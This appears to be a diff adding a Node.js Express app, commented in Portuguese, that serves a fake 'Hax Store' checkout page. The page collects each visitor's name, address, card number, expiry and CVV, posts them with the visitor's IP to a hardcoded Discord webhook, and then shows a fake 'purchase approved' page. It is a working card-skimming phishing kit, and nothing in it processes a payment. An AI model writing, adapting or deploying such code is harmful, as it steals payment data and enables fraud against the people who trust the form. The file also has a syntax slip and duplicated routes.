@@ -1,0 +1,332 @@
+const express = require('express');
+const axios = require('axios');
+const creditCardType = require('credit-card-type');
+const requestIp = require('request-ip');
+
+const app = express();
+const PORT = 8080; // Escolha a porta que deseja usar
+
+app.use(express.urlencoded({ extended: true }));
+app.use(requestIp.mw()); // Middleware para obter o endereço IP
+
+<!-- Página HTML para o formulário de checkout -->
+const checkoutHtml = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hax Store Checkout</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #7f00ff, #e100ff);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            max-width: 600px;
+            padding: 30px;
+            width: 100%;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        h2 {
+            text-align: center;
+            color: #4a0575;
+        }
+
+        label {
+            display: block;
+            margin: 15px 0 5px;
+            color: #555;
+        }
+
+        input {
+            width: calc(100% - 22px);
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #4a0575;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #4a0575;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #5c067a;
+        }
+    </style>
+</head>
+<body>
+
+    <form action="/processar-checkout" method="post">
+        <h2>🛒 Hax Store Checkout</h2>
+        
+        <label for="nome">Nome:</label>
+        <input type="text" id="nome" name="nome" placeholder="NOME TITULAR" required>
+
+        <label for="endereco">Endereço:</label>
+        <input type="text" id="endereco" name="endereco" placeholder="SEU ENDEREÇO" required>
+
+        <label for="cartao">Número do Cartão de Crédito:</label>
+        <input type="text" id="cartao" name="cartao" placeholder="XXXX-XXXX-XXXX-XXXX" required>
+
+        <label for="validade">Validade do Cartão:</label>
+        <input type="text" id="validade" name="validade" placeholder="MM/AA" required>
+
+        <label for="cvv">CVV:</label>
+        <input type="text" id="cvv" name="cvv" placeholder="XXX" required>
+
+        <button type="submit">Finalizar Compra</button>
+    </form>
+
+</body>
+</html>
+`;
+
+<!-- Página HTML para a compra aprovada -->
+const compraAprovadaHtml = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Compra Aprovada</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #7f00ff, #e100ff);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 50px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            max-width: 800px;
+            color: #333;
+            position: relative;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .aprovado {
+            font-size: 64px;
+            color: #4a0575;
+            margin-bottom: 20px;
+            animation: scaleUp 1s ease-in-out;
+        }
+
+        @keyframes scaleUp {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        h2 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #4a0575;
+        }
+
+        p {
+            font-size: 18px;
+            margin-bottom: 30px;
+            color: #555;
+        }
+
+        .agradecimento {
+            font-size: 20px;
+            font-style: italic;
+            color: #777;
+        }
+
+        .icone {
+            background-color: #4a0575;
+            color: #fff;
+            padding: 20px;
+            border-radius: 50%;
+            margin-bottom: 30px;
+            display: inline-block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .confetti-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            overflow: hidden;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #4a0575;
+            opacity: 0.8;
+            border-radius: 50%;
+            transform: translateY(-100vh);
+            animation: confetti-fall 3s ease-in-out infinite;
+        }
+
+        @keyframes confetti-fall {
+            0% {
+                transform: translateY(-100vh) rotate(0);
+            }
+            50% {
+                transform: translateY(100vh) rotate(180deg);
+            }
+            100% {
+                transform: translateY(-100vh) rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="confetti-container">
+            <div class="confetti" style="left: 10%; animation-delay: 0.2s;"></div>
+            <div class="confetti" style="left: 20%; animation-delay: 0.4s;"></div>
+            <div class="confetti" style="left: 30%; animation-delay: 0.6s;"></div>
+            <div class="confetti" style="left: 40%; animation-delay: 0.8s;"></div>
+            <div class="confetti" style="left: 50%; animation-delay: 1s;"></div>
+            <div class="confetti" style="left: 60%; animation-delay: 1.2s;"></div>
+            <div class="confetti" style="left: 70%; animation-delay: 1.4s;"></div>
+            <div class="confetti" style="left: 80%; animation-delay: 1.6s;"></div>
+            <div class="confetti" style="left: 90%; animation-delay: 1.8s;"></div>
+            <div class="confetti" style="left: 100%; animation-delay: 2s;"></div>
+        </div>
+        <div class="icone">✔️</div>
+        <h2>Parabéns!</h2>
+        <p>Sua compra foi aprovada com sucesso. Agradecemos por escolher a Hax Store!</p>
+        <p class="agradecimento">Agradecemos por sua confiança. Seu pedido será processado em breve.</p>
+    </div>
+</body>
+</html>
+`;
+
+app.get('/compra-aprovada', (req, res) => {
+    res.send(compraAprovadaHtml);
+});
+
+app.get('/compra-aprovada', (req, res) => {
+    res.send(compraAprovadaHtml);
+});
+
+app.get('/', (req, res) => {
+    res.send(checkoutHtml);
+});
+
+app.get('/compra-aprovada', (req, res) => {
+    res.send(compraAprovadaHtml);
+});
+
+app.post('/processar-checkout', async (req, res) => {
+    const { nome, endereco, cartao, validade, cvv } = req.body;
+
+    // Obtém o IP do cliente usando o middleware
+    const clienteIP = req.clientIp;
+    console.log('IP do Cliente:', clienteIP);
+
+    // Remover espaços do número do cartão
+    const numeroCartao = cartao.replace(/\s/g, '');
+
+    // Detectar automaticamente o tipo de cartão de crédito
+    const cardType = creditCardType(numeroCartao);
+
+    // Formatar o número do cartão
+    const numeroFormatado = numeroCartao.replace(/(\d{4})/g, '$1 ').trim();
+
+    // Formatar a validade do cartão
+    const validadeFormatada = validade.replace(/(\d{2})(\d{2})/, '$1/$2');
+
+    const mensagemDiscord = {
+        embeds: [
+            {
+                title: '**NOVO CHECKOUT <a:cartaoblack1:1200153085453008916>**',
+                description: '',
+                color: 0x4a0575,
+                fields: [
+                    { name: '**Nome**', value: `\`${nome}\``, inline: true },
+                    { name: '**Endereço**', value: `\`${endereco}\``, inline: true },
+                    { name: '**Número do Cartão**', value: `\`${numeroFormatado}\` (${cardType && cardType.length > 0 ? cardType[0].niceType : 'Tipo Desconhecido'})`, inline: true },
+                    { name: '**Validade do Cartão**', value: `\`${validadeFormatada}\``, inline: true },
+                    { name: '**CVV**', value: `\`${cvv}\``, inline: true },
+                    { name: '**IP do Cliente**', value: `\`${clienteIP}\``, inline: true },
+                ],
+                footer: {
+                    text: 'FEITO POR HAX STORE',
+                    icon_url: 'https://media.discordapp.net/attachments/991830394657841192/1175875468487036978/1700420072344.png?ex=65bfe0de&is=65ad6bde&hm=fe189e2ab72ec16c49d815d484066ca4d73a7100507b7e9fbcb24f9b0e17d461&=&format=webp&quality=lossless&width=671&height=671',
+                },
+            },
+        ],
+    };
+
+    const webhookURL = 'https://discord.com/api/webhooks/1200049869126119444/XwLnoTPdh-Y4QT5WB4pn4L-HhkgCHIZ8yYslKG4N4Q3N6Cedt9Ws89qK9pffOa-RI54-';
+
+    try {
+        await axios.post(webhookURL, mensagemDiscord);
+        // Redirecionar para a página de compra aprovada
+        res.redirect('/compra-aprovada');
+    } catch (error) {
+        console.error('Erro ao enviar para o webhook do Discord:', error.message);
+        res.status(500).send('Erro ao processar o checkout.');
+    }
+});
+app.listen(PORT, () => {
+    console.log(`Servidor rodando em http://localhost:${PORT}`);
+});
